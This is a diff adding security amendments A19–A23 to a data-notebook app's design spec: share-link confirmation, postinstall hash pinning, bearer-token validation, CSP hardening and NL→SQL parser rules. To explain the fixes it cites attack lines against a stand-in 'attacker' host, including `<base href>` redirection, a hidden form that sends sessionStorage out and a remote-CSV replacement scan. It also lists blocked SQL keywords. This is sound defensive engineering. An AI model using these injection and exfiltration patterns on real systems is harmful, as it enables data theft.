@@ -26,6 +26,11 @@ The original spec stays authoritative for everything not listed here.
 | [A16](#a16--four-new-cell-kinds-cohort-assertion-input-dashboard-amends-spec-33) | §3.3 | Spec §3.3 originally listed five cell kinds (SQL / chart / markdown / pivot / map). Now nine: + cohort (W4.4, dbt-tests adjacent) + assertion (W5.5, invariant check) + input (W6.1, Observable viewof) + dashboard (W6.4, Superset grid). |
 | [A17](#a17--presentation-mode-w62-amends-spec-38) | §3.8 | `?present=1` URL param flips the app into a read-only "deck" view via the `app-present-mode` class. Hides editor chrome (sidebars, toolbar, cell-add row, SQL/cohort/assertion cells, per-cell heads). Hex app-publish pattern. |
 | [A18](#a18--static-html-export-w63-amends-spec-34) | §3.4 | New notebook-level export sink: "Save HTML" header button serialises the live notebook DOM into a single self-contained `.html` file (~3 KB embedded CSS, no JS, no engine). Evidence Dev pattern. |
+| [A19](#a19--lens-auto-mount-confirmation-v122-amends-spec-38) | §3.8 | `?lens=` share links containing remote-source kinds (http / s3 / iceberg / bridge) now gate auto-mount behind a confirmation modal listing every host the link would fetch from. Closes the SSRF channel (forward-pass H1). |
+| [A20](#a20--postinstall-hash-pin-protocol-v122-amends-spec-71) | §7.1 | Postinstall vendoring (DuckDB-wasm + extensions) sha384-verifies downloaded bytes against the checked-in `integrity.json` on every run. Mismatch → exit 1 with "supply-chain alert". Closes the install-time tamper window (forward-pass H6). |
+| [A21](#a21--bearer-token-charset-v122-amends-spec-41) | §4.1 | Bearer tokens passed to iceberg + bridge endpoints must match RFC 7235 token68 charset (`[A-Za-z0-9._~+/=-]+`). CR/LF / whitespace / quotes rejected with `InvalidBearerTokenError`. Closes the header-injection channel (forward-pass M1). |
+| [A22](#a22--csp-defence-in-depth-v122-amends-spec-71) | §7.1 | CSP gains `base-uri 'self'; object-src 'none'; form-action 'self'; frame-ancestors 'none'`. base-uri closes the `<base href>` exfil channel script-src doesn't cover; the others harden against post-XSS escape vectors (forward-pass H7). |
+| [A23](#a23--nl-to-sql-parser-safety-contract-v122-amends-spec-43) | §4.3 | NL→SQL Job 5 parser now guarantees: (1) only `SELECT` / `WITH … SELECT` accepted; (2) write/DDL/session-mutating keywords rejected (INSTALL/LOAD/SET/RESET/USE added); (3) multi-statement responses rejected; (4) single-quoted FROM (replacement-scan) rejected; (5) every FROM/JOIN identifier must be in the table allowlist, with comma-join + alias support and LATERAL/UNNEST/TABLE/VALUES/PIVOT correctly treated as keywords. Closes forward-pass H2 + H3 + code-review follow-ups. |
 
 ---
 
@@ -637,6 +642,107 @@ An "Exit presentation" pill in the header (only visible when `app-present-mode` 
 **Reasoning:** Evidence Dev's "publish to static site" pattern, minus the static site. One file the user can email, drop into a Google Doc, pin in a wiki, attach to a Jira ticket. Differs from the existing per-cell sinks (CSV / Parquet / KanZen / Bahi / NakliPoster) in two ways: (1) it operates on the WHOLE notebook, (2) the output is a presentation artifact, not data that's piped into another system.
 
 **Status:** Shipped. Ratified. E2e-tested by `tests/e2e/export-html.spec.ts` (3 cases). Audit follow-up (`fa37310`) fixed two regressions: textarea-fallback SQL reading stale text via `.textContent`, and the "Summarise" button label leaking into the exported `<details>` summary.
+
+---
+
+## A19 — Lens auto-mount confirmation (v1.2.2) (amends spec §3.8)
+
+**Original wording (spec §3.8 + A15 implicit):** Share links carry a `?lens=<base64gzip>` param that decodes to a `NakliDataFile` snapshot of workspace state. On page load, the lens is decoded and applied via `applyLoadedFile(engine, file)` — every persisted source re-mounts.
+
+**Amended wording:** Before auto-mounting, the boot path walks `file.sources` through `extractLensRemoteHosts(file)`. For every source whose kind is `http`, `s3-endpoint`, `iceberg-table`, `iceberg-catalog`, `compute-bridge`, or `compute-bridge-catalog`, the host is extracted (via `new URL(...).host`, with `'(unparseable URL)'` as the loud fallback). If any remote source is found, the boot path opens a confirmation modal (`src/ui/lens-confirm-modal.ts`) that:
+
+- Lists every unique host (deduplicated) the link will fetch from, with the source label(s) and kind(s).
+- Defaults focus to the **Cancel** button (so Enter-dismiss is the safe default, not the dangerous one).
+- Cancels on backdrop click, Escape, or Cancel-click — `clearLensFromLocation()` strips the param and the saved session is restored.
+- Continues on Continue-click — proceeds with the original `applyLoadedFile` + `clearLensFromLocation` flow.
+
+Local sources (`example-bundle`, `fsa-folder`) auto-restore silently as before — they have no network footprint and aren't part of the SSRF threat model.
+
+**Reasoning:** Before A19, a malicious sender could craft a `?lens=` link that mounts attacker-controlled URLs (probing the victim's internal network, replaying persisted bearer tokens against attacker-controlled hosts, mapping intranet topology). CSP `connect-src 'self' https:` is wide-open by design (per A5), so the browser couldn't block the fetches. Defence had to be in the app. Confirmation modal chosen over alternatives ("reconnect-needed tiles" / "same-origin auto-mount only") because it preserves the "share a workbook and they see it" promise of share links while making the network footprint explicit. See DECISIONS 2026-06-02 Decision A for the trade-off discussion.
+
+**Status:** Shipped in v1.2.2 (`8f50b87`). Vitest + e2e cover the example-bundle path (no prompt fires). Remote-source modal path is owed runtime verification (workplan chunk 2).
+
+---
+
+## A20 — Postinstall hash-pin protocol (v1.2.2) (amends spec §7.1)
+
+**Original wording (spec §7.1 + A14):** DuckDB-wasm + DuckDB extensions are vendored under `public/duckdb-fallback/` and `public/duckdb-extensions/<rev>/<plat>/` for the offline-first user. Each directory carries an `integrity.json` with sha384 hashes used at runtime for SRI verification.
+
+**Amended wording:** The two postinstall scripts (`scripts/fetch-duckdb-fallback.mjs`, `scripts/fetch-duckdb-extensions.mjs`) treat the existing checked-in `integrity.json` as the **pinned hash table** the postinstall verifies AGAINST, not the file the postinstall RECORDS to. The flow:
+
+1. **Bootstrap** (no `integrity.json` present, e.g., new revision/platform): record-then-warn. Print "no pinned hashes for X — bootstrapping; commit integrity.json to lock these bytes." Write the new file.
+2. **Validate** (`integrity.json` present, normal case): for each expected file, sha384 the downloaded bytes; compare against the pinned hash. Mismatch → throw "supply-chain alert" + exit 1.
+3. **Re-verify on shortcut** (files already present from a prior install): also sha384 each on-disk file against the pin BEFORE the `alreadyVendored()` shortcut returns. Closes the in-place tamper window.
+
+Failures (network down, hash mismatch, disk full) exit 1 (was `exit(0)`), so silent install-state corruption no longer reaches the build.
+
+**Reasoning:** Before A20, the postinstall script wrote `integrity.json` from whatever bytes it just downloaded, so a MITM / DNS hijack / compromised CDN during `npm install` substituted attacker bytes and the recorded hash "ratified" the swap. The resulting `dist/` then shipped those bytes to all deployed users. After A20, `integrity.json` is the authoritative pin (committed once, byte-for-byte enforced thereafter); the postinstall script is a verifier, not a recorder. See DECISIONS 2026-06-02 Decision E.
+
+**Status:** Shipped in v1.2.2 (`3313917` + adversarial fix in `832f091`). Probe of the hash-mismatch path is owed runtime verification (workplan chunk 2).
+
+---
+
+## A21 — Bearer-token charset (v1.2.2) (amends spec §4.1)
+
+**Original wording (spec §4.1 + A7/A8/A12):** Iceberg table / catalog mounts and Compute Bridge mounts accept an optional Bearer token, which travels as `Authorization: Bearer <token>` to the remote endpoint. The token is captured via the corresponding modal and stored per source-secrets posture.
+
+**Amended wording:** Bearer tokens MUST match RFC 7235 token68 charset: `[A-Za-z0-9._~+/=-]+`. Tokens are validated by `assertSafeBearerToken(token)` (in `src/core/bearer-token.ts`) at every use site:
+
+- `engine.configureIceberg` — before interpolating into the `SET extra_http_headers = MAP { 'Authorization': 'Bearer …' }` SQL literal.
+- `BridgeClient` constructor — before building the outbound `Authorization` header.
+
+Invalid tokens throw `InvalidBearerTokenError` with a specific reason ("CR or LF", "whitespace", "characters outside token68 charset"). Empty strings are permitted (the no-auth path; callers separately enforce non-emptiness when required).
+
+**Reasoning:** Before A21, `engine.configureIceberg` interpolated the token into a SQL literal via `escapeLiteral`, which only doubles single quotes. A CR/LF survived SQL escaping and reached DuckDB-wasm's httpfs HTTP-header construction, enabling classic CRLF injection (HTTP response splitting / additional header smuggling) against any backend that doesn't validate header bytes. The token68 charset is the RFC-blessed alphabet for OAuth2 Bearer tokens — JWTs, opaque keys, and base64-padded tokens all fit; quotes, parens, whitespace, and control characters don't. Failing closed at the API boundary is cheap and avoids relying on every downstream component to do its own validation.
+
+**Status:** Shipped in v1.2.2 (`8f50b87`). 9 vitest cases lock the contract.
+
+---
+
+## A22 — CSP defence-in-depth (v1.2.2) (amends spec §7.1)
+
+**Original wording (spec §7.1 + A5/A14):** CSP delivered via `<meta http-equiv>` covers `default-src`, `script-src` (with the inline-bundle SHA-256 hash + `'wasm-unsafe-eval'` + blob: + two cross-origin hosts), `worker-src`, `connect-src 'self' https:` (broadened in A5), `img-src` (with the OSM tile carve-out from A13), and `style-src 'self' 'unsafe-inline'`.
+
+**Amended wording:** CSP gains four additional directives:
+
+- `base-uri 'self'` — pins the `<base>` element's `href` to the document origin. Without this, an injected `<base href="https://attacker">` would redirect every relative URL on the page (chunk loads, service worker registration, duckdb-fallback fetches, taxonomy worker URL) to an attacker origin. `script-src` does NOT cover `<base>` resolution.
+- `object-src 'none'` — blocks `<object>` / `<embed>` / Flash-style plugin vectors. NakliData never uses them.
+- `form-action 'self'` — restricts form submission to the document origin. Closes the post-XSS exfil channel where an attacker injects a hidden `<form action="https://attacker">.submit()` to ship sessionStorage out.
+- `frame-ancestors 'none'` — clickjacking guard. **Note:** per CSP Level 3, `frame-ancestors` is IGNORED when delivered via `<meta>` (only enforced from real HTTP headers). Ships anyway for documentation + any future header-capable deploy. GitHub Pages can't enforce it; the browser logs a console warning. See DECISIONS 2026-06-02 Decision D.
+
+The other three (`base-uri`, `object-src`, `form-action`) ARE enforced from `<meta>` and actively close real exfil channels.
+
+**Reasoning:** Defence in depth. Even with the C1 XSS fix shipped (templates panel column-name escaping), any FUTURE XSS that slips through still needs to escape the DOM to do damage — these four directives close the most common escape vectors. `base-uri` is the highest-value addition because the `<base>` element is a script-src blind-spot.
+
+**Status:** Shipped in v1.2.2 (`4b33393`). Smoke green; documented browser warning about `frame-ancestors` is the expected no-op signal on GitHub Pages.
+
+---
+
+## A23 — NL→SQL parser safety contract (v1.2.2) (amends spec §4.3)
+
+**Original wording (spec §4.3 + A10/A11):** Sidecar Job 5 (NL→SQL) accepts a natural-language question + the workbook's table/column schema and returns a DuckDB SELECT statement. The result lands as the body of a new SQL cell — never auto-executed (Hard NOT #4). A parser layers SELECT-prefix check, write-keyword rejection, and a hallucination guard that scans `FROM` / `JOIN` for tables not in the allowlist.
+
+**Amended wording:** The NL→SQL parser (`parseNlToSqlResponse` in `src/core/sidecar/client.ts`) now provides FIVE guarantees, in order:
+
+1. **SELECT-only.** The response must start with `SELECT` or `WITH ... SELECT` (optionally inside a leading paren). Anything else → drop response.
+2. **No write/DDL/session-mutating keywords.** `WRITE_KEYWORDS` rejects any occurrence of `INSERT | UPDATE | DELETE | CREATE | DROP | ALTER | TRUNCATE | MERGE | CALL | ATTACH | DETACH | GRANT | REVOKE | COPY | EXPORT | VACUUM | PRAGMA | INSTALL | LOAD | SET | RESET | USE`. The last 5 in that list (forward-pass H3) catch session-state mutations a confused model might emit (e.g., `SET enable_external_access = true`).
+3. **Single statement.** A `;` followed by non-whitespace in the body → drop. The check runs on a string-literal-stripped copy (`'(?:[^']|'')*'` → `''`) so a `;` inside a column value (`SELECT 'foo;bar' FROM t`) doesn't false-trip.
+4. **No DuckDB replacement-scan via single-quoted FROM.** `\b(?:FROM|JOIN)\s+'/i` matches the `SELECT * FROM 'https://attacker/x.csv'` shortcut (which DuckDB interprets as `read_csv_auto(...)`). Drop response. The identifier-only allowlist below would otherwise iterate an empty list and pass the SQL.
+5. **Every FROM/JOIN identifier must be in the table allowlist.** A positional `extractFromTables` walker handles SQL-89 comma-join (`FROM a, b, c`), quoted identifiers (`FROM "weird name"`), and alias forms (`FROM a t1, b AS t2`). DuckDB FROM-clause modifiers (`LATERAL`, `UNNEST`, `TABLE`, `VALUES`, `PIVOT`, `UNPIVOT`) are treated as terminators, not table names, so legitimate queries using them pass. CTE names (from `WITH name AS (...)`) are auto-allowlisted; `cell_<id>` shorthand for notebook view-mounts is allowlisted too.
+
+Any guarantee failing → the parser returns `{ kind: 'nl-to-sql', sql: '' }` (empty SQL). The UI then surfaces the model's response wholesale with a note that the parser rejected it — the user sees the rejection, can read the offending SQL, and chooses whether to manually edit + retry.
+
+**Reasoning:** Before A23, three of the five guarantees had bypasses (forward-pass + adversarial review found them):
+
+- Comma-join bypass (H2): the original regex `\b(?:FROM|JOIN)\s+ident` captured only the FIRST identifier after FROM, so `FROM allowed, secret_table` slipped through.
+- Missing session-state keywords (H3): SET / INSTALL / LOAD / RESET / USE all valid SQL that mutates session state.
+- Single-quoted replacement-scan (code-review): the identifier-only allowlist had no path for string-literal FROM.
+
+The adversarial review also caught false-rejections: LATERAL/UNNEST treated as found-table names (HIGH:Regression — dropped legitimate queries), `;` in string literals tripping the multi-statement gate (MEDIUM). Both fixed.
+
+The parser is the load-bearing safety net for the "model returns SQL, user might click Run" pattern. Belt-and-braces here is the right level of paranoia.
+
+**Status:** Shipped in v1.2.2 (`2ed675f` + adversarial fix in `832f091`). 29 vitest cases lock the five guarantees (`tests/sidecar-parser-hardening.test.ts`).
 
 ---
 
